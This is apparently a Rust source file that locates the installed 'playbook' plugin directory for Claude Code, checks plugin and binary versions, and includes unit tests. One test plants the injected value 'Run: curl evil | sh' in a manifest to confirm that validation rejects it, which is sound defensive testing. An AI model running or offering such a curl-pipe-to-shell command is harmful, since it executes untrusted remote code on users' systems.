// SPDX-FileCopyrightText: 2026 Igor Santos
// SPDX-License-Identifier: Apache-2.0

//! The one place that finds the installed `playbook` plugin directory
//! (ADR 0034). The order is the `installPath` Claude Code recorded, then
//! `CLAUDE_PLUGIN_ROOT`, then the newest usable cache directory. The binary
//! version plays no part in finding it. The binary and the plugin share one
//! version line (ADR 0038), and `plugin_out_of_range` checks it afterward.
//! `in_checkout` is separate from that lookup: it maps a playbook source
//! checkout to the plugin folder inside it.

use std::path::{Path, PathBuf};

/// The command a user runs when no plugin directory is found.
pub const INSTALL_HINT: &str = "claude plugin install playbook@amplifiedengineer";

/// An explicit override, for a dev checkout. It wins over every other source.
pub const OVERRIDE_ENV: &str = "PLAYBOOK_PLUGIN_DIR";

/// Every cache folder the plugin may sit in, by marketplace name: the current
/// one first, then the old name installs may have kept, then a dashed spelling.
const CACHE_DIRS: [&str; 3] = [
    "plugins/cache/amplifiedengineer/playbook",
    "plugins/cache/pragmatic-engineer/playbook",
    "plugins/cache/amplified-engineer/playbook",
];
/// The file Claude Code writes into a plugin cache version it no longer uses.
pub const ORPHAN_MARKER: &str = ".orphaned_at";
const PLUGIN_NAME: &str = "playbook";

/// Where the plugin files sit inside the playbook source checkout.
pub const CHECKOUT_PLUGIN_DIR: &str = "plugins/playbook";

/// The plugin folder inside the checkout at `root`: `plugins/playbook` when
/// it exists, else `root` itself, for a checkout that holds only the plugin.
pub fn in_checkout(root: &Path) -> PathBuf {
    let nested = root.join(CHECKOUT_PLUGIN_DIR);
    if nested.is_dir() {
        nested
    } else {
        root.to_path_buf()
    }
}

/// Where a resolved directory came from.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Source {
    Override,
    InstallPath,
    Env,
    Cache,
    Embedded,
}

impl Source {
    pub fn label(self) -> &'static str {
        match self {
            Source::Override => OVERRIDE_ENV,
            Source::InstallPath => "installPath in installed_plugins.json",
            Source::Env => "CLAUDE_PLUGIN_ROOT",
            Source::Cache => "the plugin cache",
            Source::Embedded => "the copies inside the playbook binary",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Resolved {
    pub root: PathBuf,
    pub source: Source,
    /// Places tried before this one that were set but not usable, such as a
    /// stale override. Empty in the usual case.
    pub skipped: Vec<String>,
}

/// Nothing resolved. Each entry names one place tried and why it was skipped.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NotFound {
    pub tried: Vec<String>,
}

impl std::fmt::Display for NotFound {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "playbook plugin not found (tried {}); run `{INSTALL_HINT}`",
            self.tried.join(", ")
        )
    }
}

/// What the resolver reads, passed in so tests never touch the real home.
pub struct Inputs<'a> {
    pub claude_home: &'a Path,
    /// `PLAYBOOK_PLUGIN_DIR`.
    pub override_env: Option<&'a str>,
    /// `CLAUDE_PLUGIN_ROOT`.
    pub env: Option<&'a str>,
    pub cwd: &'a Path,
}

/// Finds the plugin directory. See the module doc for the order.
pub fn resolve(inputs: &Inputs) -> Result<Resolved, NotFound> {
    let mut tried = Vec::new();

    if let Some(root) = inputs
        .override_env
        .filter(|s| !s.is_empty())
        .map(PathBuf::from)
    {
        if is_plugin_dir(&root) {
            return Ok(Resolved {
                root,
                source: Source::Override,
                skipped: tried,
            });
        }
        tried.push(format!("{OVERRIDE_ENV} {} (not usable)", root.display()));
    }

    let listed = install_paths(inputs.claude_home, inputs.cwd);
    match listed.iter().find(|p| is_plugin_dir(p)) {
        Some(root) => {
            return Ok(Resolved {
                root: root.clone(),
                source: Source::InstallPath,
                skipped: tried,
            })
        }
        None if listed.is_empty() => tried.push("installPath (not listed)".to_string()),
        None => tried.push(format!(
            "installPath {} (not usable)",
            listed
                .iter()
                .map(|p| p.display().to_string())
                .collect::<Vec<_>>()
                .join(", ")
        )),
    }

    match inputs.env.filter(|s| !s.is_empty()).map(PathBuf::from) {
        Some(root) if is_plugin_dir(&root) => {
            return Ok(Resolved {
                root,
                source: Source::Env,
                skipped: tried,
            })
        }
        Some(root) => tried.push(format!(
            "CLAUDE_PLUGIN_ROOT {} (not usable)",
            root.display()
        )),
        None => tried.push("CLAUDE_PLUGIN_ROOT (unset)".to_string()),
    }

    if let Some(root) = newest_in_any_cache(inputs.claude_home) {
        return Ok(Resolved {
            root,
            source: Source::Cache,
            skipped: tried,
        });
    }
    tried.extend(CACHE_DIRS.iter().map(|d| {
        format!(
            "{} (no usable version)",
            inputs.claude_home.join(d).display()
        )
    }));
    Err(NotFound { tried })
}

/// `resolve` for this process: the real home, `CLAUDE_PLUGIN_ROOT` and the
/// current directory.
pub fn resolve_here() -> Result<Resolved, NotFound> {
    resolve_from(&crate::common::home_dir())
}

/// [`resolve_here`] for the Claude Code folder under `home`.
pub fn resolve_from(home: &Path) -> Result<Resolved, NotFound> {
    let claude_home = home.join(".claude");
    let env = std::env::var("CLAUDE_PLUGIN_ROOT").ok();
    let override_env = std::env::var(OVERRIDE_ENV).ok();
    let cwd = std::env::current_dir().unwrap_or_default();
    resolve(&Inputs {
        claude_home: &claude_home,
        override_env: override_env.as_deref(),
        env: env.as_deref(),
        cwd: &cwd,
    })
}

/// `resolve_here`'s directory, or `None`, for callers that treat a missing
/// plugin as "no plugin files", never as an error.
pub fn find_here() -> Option<PathBuf> {
    resolve_here().ok().map(|r| r.root)
}

/// The resolved directory for an explicit `CLAUDE_PLUGIN_ROOT` value and Claude
/// home, with no override, or `None`. Reads only the current directory from
/// the process.
pub fn find(env: Option<&str>, claude_home: &Path) -> Option<PathBuf> {
    let cwd = std::env::current_dir().unwrap_or_default();
    resolve(&Inputs {
        claude_home,
        override_env: None,
        env,
        cwd: &cwd,
    })
    .ok()
    .map(|r| r.root)
}

/// A directory with plugin components, not marked orphaned by Claude Code,
/// whose manifest (when present) names `playbook`. The manifest check keeps
/// out the `playbook-variants` session plugin.
pub fn is_plugin_dir(dir: &Path) -> bool {
    dir.is_dir()
        && ["agents", "commands", "skills"]
            .iter()
            .any(|d| dir.join(d).is_dir())
        && is_ours(dir)
}

/// Not marked orphaned by Claude Code, and either no manifest or one that
/// names `playbook`. Rejects the old `playbook-hooks` plugin, the
/// `playbook-variants` session plugin and a manifest that cannot be read.
pub fn is_ours(dir: &Path) -> bool {
    if dir.join(ORPHAN_MARKER).exists() {
        return false;
    }
    let manifest = dir.join(".claude-plugin/plugin.json");
    !manifest.exists() || manifest_name(dir).is_some_and(|name| name == PLUGIN_NAME)
}

/// The `version` in the directory's `.claude-plugin/plugin.json`.
pub fn plugin_version(root: &Path) -> Option<String> {
    manifest_field(root, "/version")
}

/// The oldest binary the plugin at `root` works with, from
/// `metadata.minBinaryVersion` in its manifest.
pub fn min_binary_version(root: &Path) -> Option<String> {
    manifest_field(root, "/metadata/minBinaryVersion").filter(|v| is_plain_version(v))
}

/// `MAJOR.MINOR.PATCH` with an optional `-pre` of ASCII letters, digits and
/// dots. Anything else never reaches the session message.
pub(crate) fn is_plain_version(v: &str) -> bool {
    let (core, pre) = v.split_once('-').unwrap_or((v, ""));
    let parts: Vec<&str> = core.split('.').collect();
    parts.len() == 3
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.bytes().all(|b| b.is_ascii_digit()))
        && pre.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'.')
}

/// One line telling the user to upgrade when `binary` is older than the
/// plugin at `root` needs, else `None`. `homebrew` picks the upgrade command.
pub fn binary_too_old(root: &Path, binary: &str, homebrew: bool) -> Option<String> {
    let min = min_binary_version(root)?;
    if crate::update::resolve::compare(binary, &min) != std::cmp::Ordering::Less {
        return None;
    }
    let command = if homebrew {
        "brew upgrade playbook"
    } else {
        "playbook update"
    };
    Some(format!(
        "playbook binary {binary} is older than this plugin needs ({min}). Run: {command}"
    ))
}

/// One line when the plugin `version` is not in the minor line of `binary`
/// (ADR 0038 decision 7), naming the command that fixes it, else `None`.
/// A plugin and a binary work together when their MAJOR.MINOR match.
/// `plugin_key` is the id Claude Code lists, named in the update command.
/// `homebrew` picks the binary upgrade command for a newer plugin. A leading
/// `v` and a `+build` suffix are ignored, as `update::resolve::compare`
/// ignores them. A plugin version that does not parse says nothing, and a
/// binary version that does not parse says the range was not checked.
pub fn plugin_out_of_range(
    version: &str,
    binary: &str,
    plugin_key: &str,
    homebrew: bool,
) -> Option<String> {
    let minor_line = |v: &str| {
        let v = v.strip_prefix('v').unwrap_or(v);
        version_key(v.split('+').next().unwrap_or(v)).map(|k| (k.0, k.1))
    };
    let plugin = minor_line(version)?;
    let Some(line) = minor_line(binary) else {
        return Some(format!(
            "cannot read the playbook binary version '{binary}', so the plugin {version} was not checked against it"
        ));
    };
    match plugin.cmp(&line) {
        std::cmp::Ordering::Equal => None,
        std::cmp::Ordering::Less => Some(format!(
            "the playbook plugin {version} is older than the {}.{} line of this binary ({binary}). Run: claude plugin update {plugin_key}",
            line.0, line.1
        )),
        std::cmp::Ordering::Greater => {
            let command = if homebrew {
                "brew upgrade playbook"
            } else {
                "playbook update"
            };
            Some(format!(
                "the playbook plugin {version} is newer than the {}.{} line of this binary ({binary}). Run: {command}",
                line.0, line.1
            ))
        }
    }
}

/// Version folders in the plugin cache that Claude Code marked orphaned. The
/// resolver skips them; Claude Code deletes them later.
pub fn orphaned_cache_dirs(claude_home: &Path) -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = CACHE_DIRS
        .iter()
        .filter_map(|d| std::fs::read_dir(claude_home.join(d)).ok())
        .flatten()
        .filter_map(Result::ok)
        .map(|e| e.path())
        .filter(|p| p.join(ORPHAN_MARKER).exists())
        .collect();
    dirs.sort();
    dirs
}

fn manifest_name(dir: &Path) -> Option<String> {
    manifest_field(dir, "/name")
}

/// The directory's `.claude-plugin/plugin.json`, parsed.
pub fn manifest(dir: &Path) -> Option<serde_json::Value> {
    let text = std::fs::read_to_string(dir.join(".claude-plugin/plugin.json")).ok()?;
    serde_json::from_str(&text).ok()
}

/// The string at JSON `pointer` in the directory's `.claude-plugin/plugin.json`.
fn manifest_field(dir: &Path, pointer: &str) -> Option<String> {
    manifest(dir)?
        .pointer(pointer)?
        .as_str()
        .map(str::to_string)
}

/// The `installPath` values Claude Code lists for the plugin, best first: an
/// entry whose `projectPath` holds `cwd` (deepest first), then user entries,
/// then other entries without a `projectPath`. An entry for another project is
/// dropped, because Claude Code does not load it here.
fn install_paths(claude_home: &Path, cwd: &Path) -> Vec<PathBuf> {
    let found = crate::common::plugin_state::plugin_keys()
        .iter()
        .find_map(|key| crate::common::plugin_state::installed_entry_at(claude_home, key));
    let entries: Vec<serde_json::Value> = match found {
        Some(serde_json::Value::Array(list)) => list,
        Some(obj @ serde_json::Value::Object(_)) => vec![obj],
        _ => return Vec::new(),
    };
    let mut ranked: Vec<((u8, std::cmp::Reverse<usize>), PathBuf)> = entries
        .iter()
        .filter_map(|e| {
            let path = PathBuf::from(e.get("installPath")?.as_str()?);
            let rank = match e.get("projectPath").and_then(|p| p.as_str()) {
                Some(project) if cwd.starts_with(project) => (
                    0,
                    std::cmp::Reverse(Path::new(project).components().count()),
                ),
                Some(_) => return None,
                None if e.get("scope").and_then(|s| s.as_str()) == Some("user") => {
                    (1, std::cmp::Reverse(0))
                }
                None => (2, std::cmp::Reverse(0)),
            };
            Some((rank, path))
        })
        .collect();
    ranked.sort_by_key(|(rank, _)| *rank);
    ranked.into_iter().map(|(_, p)| p).collect()
}

/// The newest usable version directory across every cache folder in `CACHE_DIRS`.
fn newest_in_any_cache(claude_home: &Path) -> Option<PathBuf> {
    CACHE_DIRS
        .iter()
        .filter_map(|d| newest_cached(&claude_home.join(d)))
        .max_by_key(|p| p.file_name().and_then(|n| n.to_str()).and_then(version_key))
}
/// The highest usable version directory directly under `cache`. Names that do
/// not parse as `major.minor.patch` (with an optional pre-release suffix) are
/// skipped, and a pre-release sorts below its release.
fn newest_cached(cache: &Path) -> Option<PathBuf> {
    std::fs::read_dir(cache)
        .ok()?
        .filter_map(Result::ok)
        .filter(|e| is_plugin_dir(&e.path()))
        .filter_map(|e| {
            let name = e.file_name().into_string().ok()?;
            Some((version_key(&name)?, e.path()))
        })
        .max_by(|a, b| a.0.cmp(&b.0))
        .map(|(_, path)| path)
}

fn version_key(name: &str) -> Option<(u64, u64, u64, bool)> {
    let (core, pre) = match name.split_once('-') {
        Some((core, _)) => (core, true),
        None => (name, false),
    };
    let mut parts = core.split('.').map(|p| p.parse::<u64>().ok());
    let key = (parts.next()??, parts.next()??, parts.next()??, !pre);
    parts.next().is_none().then_some(key)
}

const EMBEDDED_RULES: [(&str, &str); 4] = [
    (
        "skills/writing-style/SKILL.md",
        include_str!("../../../plugins/playbook/skills/writing-style/SKILL.md"),
    ),
    (
        "skills/writing-style/references/commits-and-prs.md",
        include_str!(
            "../../../plugins/playbook/skills/writing-style/references/commits-and-prs.md"
        ),
    ),
    (
        "skills/writing-style/references/github-prohibited.md",
        include_str!(
            "../../../plugins/playbook/skills/writing-style/references/github-prohibited.md"
        ),
    ),
    (
        "skills/engineering-standards/SKILL.md",
        include_str!("../../../plugins/playbook/skills/engineering-standards/SKILL.md"),
    ),
];

/// The root `playbook pr rules` reads: the resolved plugin when it holds every
/// file the rules need, else the copies compiled into this binary, written
/// under `~/.config/playbook/embedded/<version>/plugin`.
pub fn rules_root(resolved: Option<Resolved>, home: &Path) -> Option<Resolved> {
    resolved
        .filter(|r| {
            EMBEDDED_RULES
                .iter()
                .all(|(rel, _)| r.root.join(rel).is_file())
        })
        .or_else(|| {
            write_embedded_rules(home).ok().map(|root| Resolved {
                root,
                source: Source::Embedded,
                skipped: Vec::new(),
            })
        })
}

fn write_embedded_rules(home: &Path) -> std::io::Result<PathBuf> {
    let root = crate::common::paths::playbook_root_from(home)
        .join("embedded")
        .join(env!("CARGO_PKG_VERSION"))
        .join("plugin");
    for (rel, body) in EMBEDDED_RULES {
        let path = root.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        if std::fs::read_to_string(&path).is_ok_and(|have| have == body) {
            continue;
        }
        crate::common::atomic::write_atomic(&path, body)?;
    }
    Ok(root)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::common::plugin_state::PLUGIN_KEY;
    use crate::common::test_support::scratch_dir;
    use std::fs;

    fn plugin_at(dir: &Path, name: &str, version: &str) -> PathBuf {
        fs::create_dir_all(dir.join("skills")).unwrap();
        fs::create_dir_all(dir.join(".claude-plugin")).unwrap();
        fs::write(
            dir.join(".claude-plugin/plugin.json"),
            format!(r#"{{"name":"{name}","version":"{version}"}}"#),
        )
        .unwrap();
        dir.to_path_buf()
    }

    fn cached(claude_home: &Path, version: &str) -> PathBuf {
        plugin_at(
            &claude_home.join(CACHE_DIRS[0]).join(version),
            "playbook",
            version,
        )
    }

    fn list_install(claude_home: &Path, entries: &str) {
        fs::create_dir_all(claude_home.join("plugins")).unwrap();
        fs::write(
            claude_home.join("plugins/installed_plugins.json"),
            format!(r#"{{"version":2,"plugins":{{"playbook@amplifiedengineer":[{entries}]}}}}"#),
        )
        .unwrap();
    }

    fn run(claude_home: &Path, env: Option<&str>) -> Result<Resolved, NotFound> {
        resolve(&Inputs {
            claude_home,
            override_env: None,
            env,
            cwd: Path::new("/nowhere"),
        })
    }

    #[test]
    fn in_checkout_finds_the_nested_plugin_folder() {
        let root = scratch_dir("in-checkout-nested");
        fs::create_dir_all(root.join("plugins/playbook/agents")).unwrap();
        fs::create_dir_all(root.join("agents")).unwrap();
        assert_eq!(in_checkout(&root), root.join("plugins/playbook"));
    }

    #[test]
    fn in_checkout_falls_back_to_the_root_for_a_plugin_only_checkout() {
        let root = scratch_dir("in-checkout-flat");
        fs::create_dir_all(root.join("agents")).unwrap();
        assert_eq!(in_checkout(&root), root);
    }

    #[test]
    fn the_override_wins_over_the_install_path() {
        // Arrange
        let home = scratch_dir("plugin-root-override");
        let active = cached(&home, "0.28.0");
        list_install(
            &home,
            &format!(r#"{{"scope":"user","installPath":"{}"}}"#, active.display()),
        );
        let checkout = plugin_at(&home.join("checkout"), "playbook", "0.31.0");

        // Act
        let got = resolve(&Inputs {
            claude_home: &home,
            override_env: checkout.to_str(),
            env: None,
            cwd: Path::new("/nowhere"),
        })
        .unwrap();

        // Assert
        assert_eq!(got.root, checkout);
        assert_eq!(got.source, Source::Override);
    }

    #[test]
    fn a_version_1_install_entry_is_read_too() {
        // Arrange
        let home = scratch_dir("plugin-root-v1");
        let active = cached(&home, "0.25.0");
        cached(&home, "0.30.0");
        fs::write(
            home.join("plugins/installed_plugins.json"),
            format!(
                r#"{{"version":1,"plugins":{{"playbook@amplifiedengineer":{{"version":"0.25.0","installPath":"{}"}}}}}}"#,
                active.display()
            ),
        )
        .unwrap();

        // Act and assert
        assert_eq!(run(&home, None).unwrap().root, active);
    }

    #[test]
    fn the_install_path_wins_over_the_env_var_and_a_newer_cache_dir() {
        // Arrange
        let home = scratch_dir("plugin-root-install");
        let active = cached(&home, "0.28.0");
        cached(&home, "0.30.0");
        let env_dir = plugin_at(&home.join("checkout"), "playbook", "0.31.0");
        list_install(
            &home,
            &format!(r#"{{"scope":"user","installPath":"{}"}}"#, active.display()),
        );

        // Act
        let got = run(&home, env_dir.to_str()).unwrap();

        // Assert
        assert_eq!(got.root, active);
        assert_eq!(got.source, Source::InstallPath);
    }

    #[test]
    fn a_project_entry_for_the_current_directory_beats_the_user_entry() {
        // Arrange
        let home = scratch_dir("plugin-root-project");
        let user = cached(&home, "0.28.0");
        let project = cached(&home, "0.29.0");
        list_install(
            &home,
            &format!(
                r#"{{"scope":"user","installPath":"{}"}},{{"scope":"project","projectPath":"/work/repo","installPath":"{}"}}"#,
                user.display(),
                project.display()
            ),
        );

        // Act
        let got = resolve(&Inputs {
            claude_home: &home,
            override_env: None,
            env: None,
            cwd: Path::new("/work/repo/src"),
        })
        .unwrap();

        // Assert
        assert_eq!(got.root, project);
    }

    #[test]
    fn a_missing_install_path_falls_back_to_the_env_var() {
        // Arrange
        let home = scratch_dir("plugin-root-stale-install");
        list_install(&home, r#"{"scope":"user","installPath":"/gone/0.25.0"}"#);
        let env_dir = plugin_at(&home.join("checkout"), "playbook", "0.31.0");

        // Act
        let got = run(&home, env_dir.to_str()).unwrap();

        // Assert
        assert_eq!(got.root, env_dir);
        assert_eq!(got.source, Source::Env);
    }

    #[test]
    fn an_env_var_without_components_or_naming_another_plugin_is_skipped() {
        // Arrange
        let home = scratch_dir("plugin-root-env-skip");
        let empty = home.join("hooks-only");
        fs::create_dir_all(&empty).unwrap();
        let variants = plugin_at(&home.join("variants"), "playbook-variants", "0.0.0");
        let cache = cached(&home, "0.30.0");

        // Act and assert
        assert_eq!(run(&home, empty.to_str()).unwrap().root, cache);
        assert_eq!(run(&home, variants.to_str()).unwrap().root, cache);
    }

    #[test]
    fn the_cache_skips_orphaned_dirs_and_picks_the_newest_by_number() {
        // Arrange
        let home = scratch_dir("plugin-root-cache");
        cached(&home, "0.9.0");
        let want = cached(&home, "0.15.0");
        let orphan = cached(&home, "0.40.0");
        fs::write(orphan.join(ORPHAN_MARKER), "1").unwrap();
        fs::create_dir_all(home.join(CACHE_DIRS[0]).join("not-a-version/skills")).unwrap();

        // Act
        let got = run(&home, None).unwrap();

        // Assert
        assert_eq!(got.root, want);
        assert_eq!(got.source, Source::Cache);
    }

    #[test]
    fn a_cache_under_a_renamed_marketplace_resolves_and_the_newest_wins() {
        // Arrange
        let home = scratch_dir("plugin-root-renamed-cache");
        cached(&home, "0.9.0");
        let want = plugin_at(
            &home.join(CACHE_DIRS[1]).join("0.15.0"),
            "playbook",
            "0.15.0",
        );
        let orphan = plugin_at(
            &home.join(CACHE_DIRS[2]).join("0.40.0"),
            "playbook",
            "0.40.0",
        );
        fs::write(orphan.join(ORPHAN_MARKER), "1").unwrap();

        // Act and assert
        assert_eq!(run(&home, None).unwrap().root, want);
        assert_eq!(orphaned_cache_dirs(&home), vec![orphan]);
    }

    #[test]
    fn the_binary_version_dir_gets_no_special_treatment() {
        // Arrange
        let home = scratch_dir("plugin-root-no-binary-version");
        cached(&home, env!("CARGO_PKG_VERSION"));
        let newer = cached(&home, "999.0.0");

        // Act and assert
        assert_eq!(run(&home, None).unwrap().root, newer);
    }

    #[test]
    fn a_release_beats_its_own_prerelease() {
        // Arrange
        let home = scratch_dir("plugin-root-pre");
        cached(&home, "1.0.0-rc.1");
        let release = cached(&home, "1.0.0");

        // Act and assert
        assert_eq!(run(&home, None).unwrap().root, release);
    }

    #[test]
    fn nothing_found_names_every_place_tried_in_one_line() {
        // Arrange
        let home = scratch_dir("plugin-root-none");

        // Act
        let err = run(&home, None).unwrap_err().to_string();

        // Assert
        assert!(!err.contains('\n'), "{err}");
        for part in [
            "installPath",
            "CLAUDE_PLUGIN_ROOT (unset)",
            CACHE_DIRS[0],
            CACHE_DIRS[1],
            CACHE_DIRS[2],
            INSTALL_HINT,
        ] {
            assert!(err.contains(part), "{part} missing: {err}");
        }
    }

    #[test]
    fn a_malformed_install_list_is_treated_as_not_listed() {
        // Arrange
        let home = scratch_dir("plugin-root-bad-json");
        fs::create_dir_all(home.join("plugins")).unwrap();
        fs::write(home.join("plugins/installed_plugins.json"), "{not json").unwrap();
        let cache = cached(&home, "0.30.0");

        // Act and assert
        assert_eq!(run(&home, None).unwrap().root, cache);
    }

    #[test]
    fn the_rules_root_uses_the_plugin_when_complete_else_the_embedded_copy() {
        // Arrange
        let home = scratch_dir("plugin-root-rules");
        let partial = plugin_at(&home.join("partial"), "playbook", "0.25.0");
        let full = plugin_at(&home.join("full"), "playbook", "0.30.0");
        for (rel, body) in EMBEDDED_RULES {
            fs::create_dir_all(full.join(rel).parent().unwrap()).unwrap();
            fs::write(full.join(rel), body).unwrap();
        }

        // Act
        let found = |root: PathBuf| Resolved {
            root,
            source: Source::Cache,
            skipped: Vec::new(),
        };
        let from_full = rules_root(Some(found(full.clone())), &home).unwrap();
        let from_partial = rules_root(Some(found(partial)), &home).unwrap();
        let from_none = rules_root(None, &home).unwrap().root;

        // Assert
        assert_eq!((from_full.root, from_full.source), (full, Source::Cache));
        assert_eq!(from_partial.source, Source::Embedded);
        let from_partial = from_partial.root;
        assert!(from_partial.starts_with(home.join(".config/playbook/embedded")));
        assert_eq!(from_partial, from_none);
        for (rel, _) in EMBEDDED_RULES {
            assert!(from_none.join(rel).is_file(), "{rel}");
        }
    }

    #[test]
    fn the_plugin_version_comes_from_the_manifest() {
        let home = scratch_dir("plugin-root-version");
        let root = plugin_at(&home.join("p"), "playbook", "0.30.1");
        assert_eq!(plugin_version(&root).as_deref(), Some("0.30.1"));
        assert_eq!(plugin_version(&home.join("missing")), None);
    }

    #[test]
    fn an_unusable_override_falls_through_and_is_named() {
        // Arrange
        let home = scratch_dir("plugin-root-bad-override");
        let empty = home.join("empty");
        fs::create_dir_all(&empty).unwrap();
        let cache = cached(&home, "0.30.0");
        let inputs = |claude_home: &Path| {
            resolve(&Inputs {
                claude_home,
                override_env: empty.to_str(),
                env: None,
                cwd: Path::new("/nowhere"),
            })
        };

        // Act
        let found = inputs(&home).unwrap();
        let missing = inputs(&scratch_dir("plugin-root-bad-override-none")).unwrap_err();

        // Assert
        assert_eq!(found.root, cache);
        assert!(
            found.skipped[0].starts_with(OVERRIDE_ENV),
            "{:?}",
            found.skipped
        );
        assert!(missing.to_string().contains(OVERRIDE_ENV), "{missing}");
    }

    #[test]
    fn install_entries_rank_by_project_depth_then_user_and_skip_other_projects() {
        // Arrange
        let home = scratch_dir("plugin-root-rank");
        let shallow = cached(&home, "0.27.0");
        let deep = cached(&home, "0.28.0");
        let user = cached(&home, "0.29.0");
        let other = cached(&home, "0.31.0");
        list_install(
            &home,
            &format!(
                r#"{{"scope":"local","projectPath":"/elsewhere","installPath":"{}"}},{{"scope":"user","installPath":"{}"}},{{"scope":"project","projectPath":"/w","installPath":"{}"}},{{"scope":"local","projectPath":"/w/repo","installPath":"{}"}}"#,
                other.display(),
                user.display(),
                shallow.display(),
                deep.display()
            ),
        );
        let at = |cwd: &str| {
            resolve(&Inputs {
                claude_home: &home,
                override_env: None,
                env: None,
                cwd: Path::new(cwd),
            })
            .unwrap()
            .root
        };

        // Act and assert
        assert_eq!(at("/w/repo/src"), deep);
        assert_eq!(at("/w/other"), shallow);
        assert_eq!(at("/somewhere"), user);
    }

    #[test]
    fn a_broken_or_foreign_manifest_is_not_ours() {
        let home = scratch_dir("plugin-root-broken-manifest");
        let broken = home.join("broken");
        fs::create_dir_all(broken.join(".claude-plugin")).unwrap();
        fs::create_dir_all(broken.join("skills")).unwrap();
        fs::write(broken.join(".claude-plugin/plugin.json"), "{not json").unwrap();
        let no_manifest = home.join("bare");
        fs::create_dir_all(no_manifest.join("skills")).unwrap();
        assert!(!is_plugin_dir(&broken));
        assert!(is_plugin_dir(&no_manifest));
    }

    fn with_min(dir: &Path, min: &str) {
        fs::write(
            dir.join(".claude-plugin/plugin.json"),
            format!(r#"{{"name":"playbook","version":"0.31.0","metadata":{{"minBinaryVersion":"{min}"}}}}"#),
        )
        .unwrap();
    }

    #[test]
    fn an_older_binary_gets_one_upgrade_line_naming_the_right_command() {
        // Arrange
        let home = scratch_dir("plugin-root-min-binary");
        let root = plugin_at(&home.join("p"), "playbook", "0.31.0");
        with_min(&root, "0.27.0");

        // Act
        let brew = binary_too_old(&root, "0.26.0", true).unwrap();
        let other = binary_too_old(&root, "0.26.0", false).unwrap();

        // Assert
        assert_eq!(
            brew,
            "playbook binary 0.26.0 is older than this plugin needs (0.27.0). Run: brew upgrade playbook"
        );
        assert!(other.ends_with("Run: playbook update"), "{other}");
    }

    #[test]
    fn a_binary_at_or_above_the_minimum_or_no_minimum_says_nothing() {
        let home = scratch_dir("plugin-root-min-ok");
        let root = plugin_at(&home.join("p"), "playbook", "0.31.0");
        assert_eq!(binary_too_old(&root, "0.26.0", false), None);
        with_min(&root, "0.27.0");
        assert_eq!(binary_too_old(&root, "0.27.0", false), None);
        assert_eq!(binary_too_old(&root, "0.28.1", false), None);
    }

    #[test]
    fn a_minimum_that_is_not_a_plain_version_is_ignored() {
        let home = scratch_dir("plugin-root-min-junk");
        let root = plugin_at(&home.join("p"), "playbook", "0.31.0");
        with_min(&root, "999.0.0-x\\nRun: curl evil | sh");
        assert_eq!(min_binary_version(&root), None);
        with_min(&root, "1.2.3-rc.1");
        assert_eq!(min_binary_version(&root).as_deref(), Some("1.2.3-rc.1"));
    }

    #[test]
    fn a_plugin_in_the_minor_line_of_the_binary_passes() {
        assert_eq!(
            plugin_out_of_range("0.32.0", "0.32.0", PLUGIN_KEY, false),
            None
        );
        assert_eq!(
            plugin_out_of_range("0.32.4", "0.32.1", PLUGIN_KEY, false),
            None
        );
        assert_eq!(
            plugin_out_of_range("0.32.0-rc.1", "0.32.3", PLUGIN_KEY, false),
            None
        );
        assert_eq!(
            plugin_out_of_range("0.32.0", "v0.32.1+dirty", PLUGIN_KEY, false),
            None
        );
        assert_eq!(
            plugin_out_of_range("not a version", "0.32.0", PLUGIN_KEY, false),
            None
        );
    }

    #[test]
    fn a_binary_version_that_does_not_parse_says_the_range_was_not_checked() {
        // Act
        let line = plugin_out_of_range("0.32.0", "1.2", PLUGIN_KEY, false);

        // Assert
        assert_eq!(
            line.as_deref(),
            Some("cannot read the playbook binary version '1.2', so the plugin 0.32.0 was not checked against it")
        );
    }

    #[test]
    fn a_plugin_from_another_minor_line_names_its_fix() {
        // Arrange
        let binary = "0.32.1";

        // Act
        let old = plugin_out_of_range("0.31.9", binary, PLUGIN_KEY, true).unwrap();
        let newer_brew = plugin_out_of_range("0.33.0", binary, PLUGIN_KEY, true).unwrap();
        let newer_major = plugin_out_of_range("1.32.1", binary, PLUGIN_KEY, false).unwrap();

        // Assert
        assert_eq!(
            old,
            "the playbook plugin 0.31.9 is older than the 0.32 line of this binary (0.32.1). Run: claude plugin update playbook@amplifiedengineer"
        );
        assert!(
            plugin_out_of_range("0.31.9", binary, "playbook@pragmatic-engineer", true)
                .unwrap()
                .ends_with("claude plugin update playbook@pragmatic-engineer")
        );
        assert_eq!(
            newer_brew,
            "the playbook plugin 0.33.0 is newer than the 0.32 line of this binary (0.32.1). Run: brew upgrade playbook"
        );
        assert!(
            newer_major.ends_with("Run: playbook update"),
            "{newer_major}"
        );
    }

    #[test]
    fn only_marked_cache_folders_count_as_orphaned() {
        let home = scratch_dir("orphans");
        let cache = home.join(".claude").join(CACHE_DIRS[0]);
        fs::create_dir_all(cache.join("0.25.0")).unwrap();
        fs::write(cache.join("0.25.0").join(ORPHAN_MARKER), "1").unwrap();
        fs::create_dir_all(cache.join("0.31.1")).unwrap();
        assert_eq!(
            orphaned_cache_dirs(&home.join(".claude")),
            vec![cache.join("0.25.0")]
        );
        assert!(orphaned_cache_dirs(&home.join("missing")).is_empty());
    }
}
